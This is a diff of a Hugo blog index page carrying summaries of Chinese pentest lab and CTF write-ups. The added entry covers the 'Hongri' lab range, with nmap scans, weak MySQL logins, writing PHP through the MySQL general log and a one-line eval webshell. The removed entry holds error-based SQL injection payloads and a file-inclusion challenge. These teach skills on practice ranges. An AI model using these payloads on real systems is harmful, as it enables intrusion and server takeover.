@@ -110,6 +110,29 @@
         alt="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp"
         title="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp" /></a></div><h1 class="home-title">ThnPinkman's blog</h1><div class="home-subtitle"><div id="id-1" class="typeit"></div></div><div class="links"></div></div>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/">红日靶场 1</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>内网渗透</a></span></div><div class="content">红日靶场 1 01环境配置 在 VMware 中选择虚拟网络编辑器设置内网网段192.168.52.0/24，NAT 和DHCP都要设置
+win7上要多添加一个桥接网卡可以分配一个真实ip
+三台靶机的默认开机密码都为hongrisec@2019
+win7就用默认密码了 ，其他两个需要修改密码，我修改成hongrisec@2022
+win7提示重启，重启后打开phpstudy
+ipconfig查看
+可以看到分配的真实ip
+访问ip得到phpstudy探针，本机也可以
+同时我们需要保持外网、域网络防火墙为未开启状态
+02信息收集 探测内网存活 netdiscover -i eth0 -r 192.168.52.0/24 nmap扫描端口 nmap -Pn -sV -p- -A 192.168.52.143 --min-rate=1000 扫端口，可以利于80,3306
+80端口也就是刚才的phpstudy探针，可以看看有无利于点
+最下面有个mysql数据库连接检测的功能，root/root 最简单的弱口令 发现检测成功
+那去找一下mysql的后台登录页面，
+dirsearch扫描目录 可以看到不少phpmyadmin，找到后台 弱口令就登录进来了
+查看日志权限 show variables like &#39;general%&#39; set global general_log= &#34;ON&#34;; 打开权限set global general_log_file=&#34;C:/phpStudy/WWW/123.php&#34;; 设置查看日志的文件，文件路径可以在探针看 03Getshell 利用日志文件getshell sql语句执行 select &quot;&lt;?php phpinfo();?&gt;&quot; ;
+访问刚才定义的日志页面 ，可以getshell
+传入shell ,连接蚁剑
+select &#34;&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;&#34; ; Yxcms后台登录getshell mysql后台看到有个newyxcms的数据库</div><div class="post-footer">
+        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/">红日靶场2</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
 </span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>内网渗透</a></span></div><div class="content">红日靶场2 拓扑图 默认密码：1qaz@WSX
@@ -188,18 +211,6 @@ fishy-motd 2020 web Welcome to Earth 之前buu写过了
 最后拿到flag</div><div class="post-footer">
         <a href="/posts/ctf/b01lers-ctf/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/buuctf-newstarctf/">BUUCTF NewStarCTF</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">week2 Word-For-You(2 Gen) 哇哇哇，我把查询界面改了，现在你们不能从数据库中拿到东西了吧哈哈（不过为了调试的代码似乎忘记删除了
-联合查询 ，没有回显点
-报错查询
-name=1&#39;and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ name=1&#39;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+ name=1&#39;and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;wfy_comments&#39;),0x7e),1)--+ name=1&#39;and updatexml(1,concat(0x7e,(select right(group_concat(text),28) from wfy.wfy_comments),0x7e),1)--+ IncludeOne 文件包含漏洞系列第一题，也不知道是不是真的随机？ 出题人丢给你了一个工具：https://www.openwall.com/php_mt_seed/
-&lt;?php highlight_file(__FILE__); error_reporting(0); include(&#34;seed.php&#34;); //mt_srand(*********); echo &#34;Hint: &#34;.mt_rand().&#34;&lt;br&gt;&#34;; if(isset($_POST[&#39;guess&#39;]) &amp;&amp; md5($_POST[&#39;guess&#39;]) === md5(mt_rand())){ if(!preg_match(&#34;/base|\.\./i&#34;,$_GET[&#39;file&#39;]) &amp;&amp; preg_match(&#34;/NewStar/i&#34;,$_GET[&#39;file&#39;]) &amp;&amp; isset($_GET[&#39;file&#39;])){ //flag in `flag.php` include($_GET[&#39;file&#39;]); }else{ echo &#34;Baby Hacker?&#34;; } }else{ echo &#34;No Hacker!&#34;; } Hint: 1219893521 给了mt_rand，用提示给的网站工具，进行爆破
-拿到正确的种子
-&lt;?php mt_srand(1145146); mt_rand(); echo mt_rand(); ?</div><div class="post-footer">
-        <a href="/posts/ctf/buuctf-newstarctf/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
 </article><ul class="pagination"><li class="page-item ">
                     <span class="page-link">
                         <a href="/">1</a>
@@ -220,12 +231,12 @@ name=1&#39;and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ name=1&#3
                     <span class="page-link" aria-hidden="true">&hellip;</span>
                 </li><li class="page-item ">
                     <span class="page-link">
-                        <a href="/page/11/">11</a>
+                        <a href="/page/12/">12</a>
                     </span>
                 </li></ul></div></div>
             </main><footer class="footer">
         <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
-                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
         </div>
     </footer></div>
 
